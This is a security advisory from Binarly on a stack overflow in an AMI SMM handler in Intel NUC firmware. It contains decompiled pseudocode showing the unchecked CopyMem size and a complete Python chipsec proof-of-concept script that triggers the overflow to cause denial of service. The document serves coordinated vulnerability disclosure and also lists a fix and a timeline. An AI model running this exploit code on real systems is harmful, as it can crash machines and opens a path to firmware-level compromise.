# [BRLY-2022-016]

# Stack overflow vulnerability in SMI handler.

## Summary

**BINARLY efiXplorer team** has discovered stack overflow vulnerability in SMI handler on Intel platforms allowing a possible attacker to execute arbitrary code in SMM.

## Vulnerability Information

* BINARLY internal vulnerability identifier: BRLY-2022-016
* Intel PSIRT assigned CVE identifier: CVE-2022-33209
* AMI PSIRT assigned CVE identifier: CVE-2022-40250
* CERT/CC assigned case number: VU#158026
* FwHunt rule: [BRLY-2022-016](https://github.com/binarly-io/FwHunt/blob/main/rules/Vulnerabilities/AMI/BRLY-2022-016.yml)
* CVSS v3.1: 8.2 High AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

## Affected Intel firmware with confirmed impact by Binarly team

| Device/Firmware | File Name | SHA256 (File PE32 section) | File GUID |
| --- | --- | --- | --- |
| Intel NUC M15 (vBC0074 (Latest)) | SmmSmbiosElog | 3a8acb4f9bddccb19ec3b22b22ad97963711550f76b27b606461cd5073a93b59 | 8e61fd6b-7a8b-404f-b83f-aa90a47cabdf |

## Potential impact

An attacker can exploit this vulnerability to elevate privileges from ring 0 to ring -2, execute arbitrary code in System Management Mode - an environment more privileged than operating system (OS) and completely isolated from it. Running arbitrary code in SMM additionally bypasses SMM-based SPI flash protections against modifications, which can help an attacker to install a firmware backdoor/implant into BIOS. Such a malicious firmware code in BIOS could persist across operating system re-installs. Additionally, this vulnerability potentially could be used by malicious actors to bypass security mechanisms provided by UEFI firmware (for example, Secure Boot and some types of memory isolation for hypervisors).

## Vulnerability description

The vulnerability exists in child SW SMI handler registered with GUID `9c72f7fb-86b6-406f-b86e-f3809a86c138` and located at offset `0x1768` in the binary.
The pseudocode for this handler is shown below:

```c++
EFI_STATUS __fastcall ChildSwSmiHandler(
        EFI_HANDLE DispatchHandle,
        const void *Context,
        _QWORD *CommBuffer,
        UINTN *CommBufferSize)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  if ( !gAmiSmmBufferValidationProtocol
    || (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(
         CommBuffer,
         48,
         CommBuffer,
         CommBufferSize) < 0 )
  {
    return 0;
  }
  switch ( *CommBuffer )
  {
    case 1:
      v13 = CommBuffer[1];
      if ( v13
        && (!gAmiSmmBufferValidationProtocol
         || (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(v13, 4095) < 0) )
      {
        return 0;
      }
      v14 = CommBuffer[4];
      if ( v14 )
      {
        if ( !gAmiSmmBufferValidationProtocol
          || (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(v14, 8) < 0 )
        {
          return 0;
        }
      }
      LOBYTE(CommBuffer14b) = *((_BYTE *)CommBuffer + 20);
      Status = gSmbiosElog->ApiFunc1(
                 gSmbiosElog,
                 CommBuffer[1],
                 *((unsigned int *)CommBuffer + 4),
                 CommBuffer14b,
                 CommBuffer[3],
                 CommBuffer[4]);
_SetStatusAndReturn:
      CommBuffer[5] = Status;
      return 0;
    case 2:
      Arg1 = CommBuffer[1];
      if ( Arg1
        && (!gAmiSmmBufferValidationProtocol
         || (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(Arg1, 4095) < 0) )
      {
        return 0;
      }
      Arg3_MaxSize = CommBuffer[3];
      if ( Arg3_MaxSize )
      {
        if ( !gAmiSmmBufferValidationProtocol
          || (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(Arg3_MaxSize, 8) < 0 )
        {
          return 0;
        }
      }
      Arg4 = CommBuffer[4];
      if ( Arg4 )
      {
        if ( !gAmiSmmBufferValidationProtocol
          || (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(Arg4, 8) < 0 )
        {
          return 0;
        }
      }
      Status = gSmbiosElog->ApiFunc2(
                 gSmbiosElog,
                 CommBuffer[1],
                 *((unsigned int *)CommBuffer + 4),
                 CommBuffer[3],
                 CommBuffer[4]);
      goto _SetStatusAndReturn;
    case 3:
      Arg2_1 = CommBuffer[2];
      if ( !Arg2_1
        || gAmiSmmBufferValidationProtocol
        && (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(Arg2_1, 8) >= 0 )
      {
        CommBuffer[3] = gSmbiosElog->ApiFunc3(gSmbiosElog, *((unsigned int *)CommBuffer + 2), CommBuffer[2]);
      }
      break;
    case 4:
      Arg2 = CommBuffer[2];
      if ( !Arg2
        || gAmiSmmBufferValidationProtocol
        && (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(Arg2, 1) >= 0 )
      {
        Arg3 = CommBuffer[3];
        if ( !Arg3
          || gAmiSmmBufferValidationProtocol
          && (gAmiSmmBufferValidationProtocol->ValidateMemoryBuffer)(Arg3, 1) >= 0 )
        {
          CommBuffer[4] = gSmbiosElog->ApiFunc4(
                            gSmbiosElog,
                            *((unsigned int *)CommBuffer + 2),
                            CommBuffer[2],
                            CommBuffer[3]);
        }
      }
      break;
  }
  return 0;
}
```

The CommBuffer is assumed to have the following structure:

* `Command` (8 bytes)
* `Arg1` (X bytes)
* `Arg2` (X bytes)
* `...`
* `ArgN` (X bytes)
* `Status` (8 bytes)

Depending on the `Command` value, one of the 4 functions can be executed:

* `gSmbiosElog->ApiFunc1`
* `gSmbiosElog->ApiFunc2`
* `gSmbiosElog->ApiFunc3`
* `gSmbiosElog->ApiFunc4`

Consider `gSmbiosElog->ApiFunc1` (located at offset `0x1768` in the binary). The pseudocode for this function is shown below:

```c++
MACRO_EFI __fastcall FuncCase1(__int64 SmbiosElog, __int16 *Arg1, __int64 Arg2, __int64 Arg3, UINTN Arg4, _QWORD *Arg5)
{
  ...
  unsigned __int8 DestinationBuffer[127];

  if ( Arg2 )
    return EFI_NOT_FOUND;
  if ( !gFlag )
    return EFI_UNSUPPORTED;
  if ( !Arg1 )
    return EFI_INVALID_PARAMETER;
  Arg5_1 = Arg5;
  if ( !Arg5 )
    return EFI_INVALID_PARAMETER;
  p_ValueFromArg1_1 = &ValueFromArg1_1;
  SetTimeInfo(&ValueFromArg1, Arg1, Arg2);
  Case = 0xFF;
  if ( *Arg1 == 0xE2 )
  {
    Value = *(Arg1 + 1);                        // should be set to 0x81 (as an example)
                                                // Value >= 0x80 and not in gCases, gCases1
    p_ValueFromArg1_1 = Arg1;
  }
  else...
  ValueFromArg1 = Value;
  if ( Value > 23 || (v13 = 0xFF7FFE, !_bittest(&v13, Value)) )
  {
    if ( Value < 0x80 )
      return EFI_UNSUPPORTED;
  }
  v14 = 0;
  while ( gCases[2 * v14] != Value )
  {
    if ( ++v14 >= 25 )
      goto _LeaveCaseFF;
  }
  Case = gCases1[2 * v14];
_LeaveCaseFF:
  ZeroMem(DestinationBuffer, 127);
  v16 = 8;
  switch...
  v30 = v16;
  switch...
  v16 = Arg4 + 8;
  v30 = Arg4 + 8;
  if ( Arg4 && DestinationBuffer != (Arg1 + 4) )
  {
    // will overwrite the return address if Arg4 >= 0x130
    CopyMem(DestinationBuffer, Arg1 + 4, Arg4);
    v16 = v30;
  }
  ...
  return EFI_OUT_OF_RESOURCES;
}
```

All arguments (`Arg1`, `Arg2`, `Arg3`, `Arg4`, `Arg5`) are controlled by the attacker.
`Arg4` is not checked, so calling `CopyMem(DestinationBuffer, Arg1 + 4, Arg4)` may cause a stack overflow.

A potential attacker could сompletely overwrite the return address via an overflow on the stack if `Arg4 >= 0x130`.

## Steps for exploitation

Below is the minimum PoC leading to DOS:

```python
import os
import struct
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
import ctypes

import chipsec
import chipsec.chipset
import hexdump
from chipsec.hal.interrupts import Interrupts
from chipsec.hal.uefi import UEFI

cs = chipsec.chipset.cs()
cs.init(None, True, True)
intr = Interrupts(cs)
uefi = UEFI(cs)

rtcode_start = 0x000000005A73B000  # from memmap
rtcode_end = 0x000000005A7FEFFF

AMI_SMM_DUMMY_PROTOCOL_REDIR_GUID = "9c72f7fb-86b6-406f-b86e-f3809a86c138"


class CommBufferStructureCase4(ctypes.LittleEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("Command", ctypes.c_uint64),
        ("Arg1", ctypes.c_uint64),
        ("Arg2", ctypes.c_uint64),
        ("Arg3", ctypes.c_uint64),
        ("StatusCode", ctypes.c_uint64),
    ]


class CommBufferStructureCase1(ctypes.LittleEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("Command", ctypes.c_uint64),  # 0x00
        ("Arg1", ctypes.c_uint64),  # 0x08
        ("Arg2", ctypes.c_uint32),  # 0x10
        ("Arg3", ctypes.c_uint8),  # 0x14
        ("Undefined", ctypes.c_uint8 * 3),
        ("Arg4", ctypes.c_uint64),  # 0x18
        ("Arg5", ctypes.c_uint64),  # 0x20
        ("StatusCode", ctypes.c_uint64),  # 0x28
    ]


def locate_smmc(rtcode_start, rtcode_end):
    # locate SMM_CORE_PRIVATE_DATA
    data = cs.helper.read_physical_mem(rtcode_start, rtcode_end - rtcode_start + 1)
    smmc_offset = data.find(b"smmc")
    smmc_loc = rtcode_start + smmc_offset

    return smmc_loc


smmc_loc = locate_smmc(rtcode_start, rtcode_end)


def set_flag_api4():
    # setup for communication buffer
    payload_loc = 0x53000000
    buffer_loc = payload_loc + 24  # CommBuffer address

    arg2_addr = payload_loc + 64
    arg3_addr = payload_loc + 65
    cs.helper.write_physical_mem(arg2_addr, 8, struct.pack("<Q", 1))

    buffer = CommBufferStructureCase4()
    buffer.Command = 4
    buffer.Arg1 = 0  # if ( Arg1 ) return EFI_NOT_FOUND
    buffer.Arg2 = arg2_addr  # FlagValue = *Arg2 == 1
    buffer.Arg3 = arg3_addr  # *Arg3 = FlagValue
    buffer.StatusCode = -1

    buffer_size = len(bytes(buffer))

    print(f"Buffer before:")
    hexdump.hexdump(bytes(buffer))

    # trigger handler
    ReturnStatus = intr.send_smmc_SMI(
        smmc_loc, AMI_SMM_DUMMY_PROTOCOL_REDIR_GUID, bytes(buffer), payload_loc
    )
    status = chipsec.hal.uefi_common.EFI_ERROR_STR(ReturnStatus)
    print(f"Handler return status: {status}")

    data = cs.helper.read_physical_mem(buffer_loc, buffer_size)
    print(f"Buffer after:")
    hexdump.hexdump(data)

    api_status_value = cs.helper.read_physical_mem(buffer_loc + 0x20, 8)
    api_status = struct.unpack("<Q", api_status_value)[0]
    status = chipsec.hal.uefi_common.EFI_ERROR_STR(api_status)
    print(f"API return status: {status}")

    flag_value = cs.helper.read_physical_mem(arg3_addr, 1)
    flag = struct.unpack("<B", flag_value)[0]
    print(f"Flag value: {flag}")


def vuln_api1():
    # setup for communication buffer
    payload_loc = 0x53000000
    buffer_loc = payload_loc + 24  # CommBuffer address

    arg5_addr = payload_loc + 120
    arg1_addr = payload_loc + 128
    cs.helper.write_physical_mem(
        arg1_addr, 1, struct.pack("<B", 0xE2)
    )  # if ( *Arg1 == 0xE2 )
    cs.helper.write_physical_mem(
        arg1_addr + 1, 1, struct.pack("<B", 0x81)
    )  # Value = *(Arg1 + 1)

    buffer = CommBufferStructureCase1()
    buffer.Command = 1
    buffer.Arg1 = arg1_addr
    buffer.Arg2 = 0  # if ( Arg2 ) return EFI_NOT_FOUND
    buffer.Arg3 = 0  # any value
    buffer.Arg4 = 1337  # CopyMem size param
    buffer.Arg5 = arg5_addr
    buffer.StatusCode = -1

    buffer_size = len(bytes(buffer))

    print(f"Buffer before:")
    hexdump.hexdump(bytes(buffer))

    # trigger handler
    ReturnStatus = intr.send_smmc_SMI(
        smmc_loc, AMI_SMM_DUMMY_PROTOCOL_REDIR_GUID, bytes(buffer), payload_loc
    )
    status = chipsec.hal.uefi_common.EFI_ERROR_STR(ReturnStatus)
    print(f"Handler return status: {status}")

    data = cs.helper.read_physical_mem(buffer_loc, buffer_size)
    print(f"Buffer after:")
    hexdump.hexdump(data)

    api_status_value = cs.helper.read_physical_mem(buffer_loc + 0x28, 8)
    api_status = struct.unpack("<Q", api_status_value)[0]
    status = chipsec.hal.uefi_common.EFI_ERROR_STR(api_status)
    print(f"API return status: {status}")


if __name__ == "__main__":
    set_flag_api4()  # set gFlag
    vuln_api1()
```

## How to fix it

In order to fix this vulnerability, the check for `Arg4` must be added before calling the `CopyMem` function.

It should be noted that vulnerable function (`FuncCase1`) is present in the firmware in two instances:

* in SmbiosElog DXE driver {13c5506e-8231-415e-9ebc-88dd115e3818}
* in SmmSmbiosElog SMM driver {8e61fd6b-7a8b-404f-b83f-aa90a47cabdf}

## Disclosure timeline

This bug is subject to a 90 day disclosure deadline. After 90 days elapsed or a patch has been made broadly available (whichever is earlier), the bug report will become visible to the public.

| Disclosure Activity                      | Date          |
| ---------------------------------------- | ------------- |
| Intel PSIRT is notified                  | 2022-06-03    |
| Intel PSIRT confirmed reported issue     | 2022-07-28    |
| Intel PSIRT assigned CVE number          | 2022-07-28    |
| Intel PSIRT provide patch release        | 2022-08-01    |
| BINARLY public disclosure date           | 2022-08-10    |

## Acknowledgements

**BINARLY efiXplorer team**
